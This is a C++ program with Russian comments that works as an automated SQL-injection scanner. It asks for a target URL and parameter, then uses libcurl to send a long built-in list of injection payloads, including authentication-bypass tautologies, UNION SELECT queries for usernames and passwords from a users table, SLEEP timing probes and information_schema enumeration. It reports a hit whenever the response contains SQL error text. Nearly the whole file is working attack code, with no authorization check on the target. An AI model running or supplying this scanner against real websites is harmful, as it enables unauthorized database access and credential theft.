#include <iostream>
#include <string>
#include <curl/curl.h>
#include <vector>
#include <chrono>

// Функция для обработки ответа от сервера
size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* s) {
    size_t newLength = size * nmemb;
    try {
        s->append((char*)contents, newLength);
    } catch (std::bad_alloc& e) {
        return 0;
    }
    return newLength;
}

// Функция для отправки HTTP-запроса
std::string sendRequest(const std::string& url) {
    CURL* curl;
    CURLcode res;
    std::string response;

    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            std::cerr << "Ошибка при выполнении запроса: " << curl_easy_strerror(res) << std::endl;
        }
        curl_easy_cleanup(curl);
    }
    return response;
}

// Функция для проверки SQL-инъекции
bool checkInjection(const std::string& url, const std::string& param, const std::string& payload) {
    std::string testUrl = url + "?" + param + "=" + payload;
    std::string response = sendRequest(testUrl);

    // Проверяем ответ на наличие признаков уязвимости
    if (response.find("SQL syntax") != std::string::npos ||
        response.find("error in your SQL syntax") != std::string::npos ||
        response.find("UNION") != std::string::npos ||
        response.find("Duplicate entry") != std::string::npos) {
        return true;
    }
    return false;
}

int main() {
    std::string url;
    std::string param;

    std::cout << "Введите URL для проверки: ";
    std::cin >> url;
    std::cout << "Введите параметр для тестирования: ";
    std::cin >> param;

    // Список SQL-инъекций
    std::vector<std::string> injections = {
        "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' #", "' OR '1'='1' /*",
        "admin' --", "admin' #", "admin' /*", "admin' OR '1'='1",
        "admin' OR '1'='1' --", "admin' OR '1'='1' #", "admin' OR '1'='1' /*",
        "\" OR \"1\"=\"1", "\" OR \"1\"=\"1\" --", "\" OR \"1\"=\"1\" #", "\" OR \"1\"=\"1\" /*",
        "admin\" --", "admin\" #", "admin\" /*", "admin\" OR \"1\"=\"1",
        "admin\" OR \"1\"=\"1\" --", "admin\" OR \"1\"=\"1\" #", "admin\" OR \"1\"=\"1\" /*",
        "1' OR '1'='1", "1' OR '1'='1' --", "1' OR '1'='1' #", "1' OR '1'='1' /*",
        "1\" OR \"1\"=\"1", "1\" OR \"1\"=\"1\" --", "1\" OR \"1\"=\"1\" #", "1\" OR \"1\"=\"1\" /*",
        "1' UNION SELECT null, null, null --", "1' UNION SELECT null, null, null #", "1' UNION SELECT null, null, null /*",
        "1\" UNION SELECT null, null, null --", "1\" UNION SELECT null, null, null #", "1\" UNION SELECT null, null, null /*",
        "1' UNION SELECT username, password FROM users --", "1' UNION SELECT username, password FROM users #", "1' UNION SELECT username, password FROM users /*",
        "1\" UNION SELECT username, password FROM users --", "1\" UNION SELECT username, password FROM users #", "1\" UNION SELECT username, password FROM users /*",
        "1' AND 1=1 --", "1' AND 1=1 #", "1' AND 1=1 /*", "1\" AND 1=1 --", "1\" AND 1=1 #", "1\" AND 1=1 /*",
        "1' AND 1=2 --", "1' AND 1=2 #", "1' AND 1=2 /*", "1\" AND 1=2 --", "1\" AND 1=2 #", "1\" AND 1=2 /*",
        "1' AND SLEEP(5) --", "1' AND SLEEP(5) #", "1' AND SLEEP(5) /*", "1\" AND SLEEP(5) --", "1\" AND SLEEP(5) #", "1\" AND SLEEP(5) /*",
        "1' AND (SELECT * FROM users) --", "1' AND (SELECT * FROM users) #", "1' AND (SELECT * FROM users) /*",
        "1\" AND (SELECT * FROM users) --", "1\" AND (SELECT * FROM users) #", "1\" AND (SELECT * FROM users) /*",
        "1' AND (SELECT COUNT(*) FROM users) > 0 --", "1' AND (SELECT COUNT(*) FROM users) > 0 #", "1' AND (SELECT COUNT(*) FROM users) > 0 /*",
        "1\" AND (SELECT COUNT(*) FROM users) > 0 --", "1\" AND (SELECT COUNT(*) FROM users) > 0 #", "1\" AND (SELECT COUNT(*) FROM users) > 0 /*",
        "1' AND (SELECT @@version) --", "1' AND (SELECT @@version) #", "1' AND (SELECT @@version) /*",
        "1\" AND (SELECT @@version) --", "1\" AND (SELECT @@version) #", "1\" AND (SELECT @@version) /*",
        "1' AND (SELECT user()) --", "1' AND (SELECT user()) #", "1' AND (SELECT user()) /*",
        "1\" AND (SELECT user()) --", "1\" AND (SELECT user()) #", "1\" AND (SELECT user()) /*",
        "1' AND (SELECT database()) --", "1' AND (SELECT database()) #", "1' AND (SELECT database()) /*",
        "1\" AND (SELECT database()) --", "1\" AND (SELECT database()) #", "1\" AND (SELECT database()) /*",
        "1' AND (SELECT table_name FROM information_schema.tables) --", "1' AND (SELECT table_name FROM information_schema.tables) #", "1' AND (SELECT table_name FROM information_schema.tables) /*",
        "1\" AND (SELECT table_name FROM information_schema.tables) --", "1\" AND (SELECT table_name FROM information_schema.tables) #", "1\" AND (SELECT table_name FROM information_schema.tables) /*",
        "1' AND (SELECT column_name FROM information_schema.columns) --", "1' AND (SELECT column_name FROM information_schema.columns) #", "1' AND (SELECT column_name FROM information_schema.columns) /*",
        "1\" AND (SELECT column_name FROM information_schema.columns) --"
    };

    // Проверяем каждую инъекцию
    for (const auto& injection : injections) {
        std::cout << "Проверка: " << injection << std::endl;
        if (checkInjection(url, param, injection)) {
            std::cout << "[+] Уязвимость обнаружена: " << injection << std::endl;
        } else {
            std::cout << "[-] Уязвимость не обнаружена: " << injection << std::endl;
        }
    }

    return 0;
}
